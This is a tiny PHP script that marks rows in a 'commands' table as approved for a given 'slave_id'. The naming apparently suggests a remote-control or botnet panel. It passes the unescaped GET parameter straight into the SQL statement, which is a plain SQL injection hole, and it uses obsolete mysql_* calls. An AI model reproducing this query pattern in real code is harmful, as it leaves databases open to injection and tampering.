<?
include("../includes/configuration.inc.php");
include("../includes/mysql_connect.inc.php");
$userid = $_GET['id'];
$update_id = "UPDATE commands SET status='approved' WHERE slave_id='$userid'";
mysql_query($update_id, $connect);
?>